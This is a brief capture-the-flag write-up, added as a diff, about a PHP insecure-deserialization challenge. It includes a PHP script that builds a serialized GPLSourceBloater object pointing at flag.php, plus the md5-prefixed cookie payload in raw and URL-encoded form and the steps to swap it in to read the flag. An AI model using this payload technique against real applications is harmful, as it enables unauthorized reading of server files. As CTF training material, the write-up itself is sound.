@@ -1,0 +1,31 @@
+the objective of the challenge was to read the file flag.php. 
+In order to achive the objective you have to inspect the code. In this challenge 
+there was a class GPLSourceBloater with an override of the method toString(), 
+printing the property "source" of the class. To explicit call this method we could 
+force it by using the todos. A breathly use of the page shows how the todos are saved 
+in the cookies. So basically we wrote an easy program in php to print the coockie
+
+<?php
+Class GPLSourceBloater{
+}
+
+$s = new GPLSourceBloater();
+$s->source = "flag.php";
+$todos[] = $s;
+$m = serialize($todos);
+$h = md5($m);
+
+echo $h.$m ;
+
+?> 
+
+the result of the echo was 
+
+760463360e4919ca238d1566fc26661fa:1:{i:0;O:16:"GPLSourceBloater":1:{s:6:"source";s:8:"flag.php";}}
+
+when you set the cookie you have to be sure that all characters are allowed, so using a tool you 
+can url-encode it
+
+760463360e4919ca238d1566fc26661fa%3A1%3A%7Bi%3A0%3BO%3A16%3A%22GPLSourceBloater%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D 
+
+if you now change the old cookie with this one it is going to print the content of flag.php
